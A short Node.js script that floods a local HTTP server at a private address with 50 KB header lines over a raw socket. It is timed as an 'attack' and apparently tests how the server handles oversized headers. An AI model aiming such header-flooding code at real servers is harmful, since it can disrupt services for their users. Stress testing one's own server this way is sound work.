var net = require('net');
var buf = new Buffer(1024*50);
buf.fill('h');
var head_str = 'GET / HTTP/1.1\r\nHost: 192.168.17.55\r\n'
var i = 1;//10W次的发送
console.time('attack')
var client = net.connect({port: 8124, host:'192.168.17.55'});

client.on('error', function(e) {
	console.log(e);
});
client.on('data', function(d) {
	console.log(d.toString());
});
client.on('end', function(d) {
	console.log('conn close');
});
client.write(head_str);
while(i--){
	if(i==0) console.timeEnd('attack');
	client.write(i+': '+buf.toString()+'\r\n');
}
client.write(i+': '+buf.toString()+'\r\n\r\n');
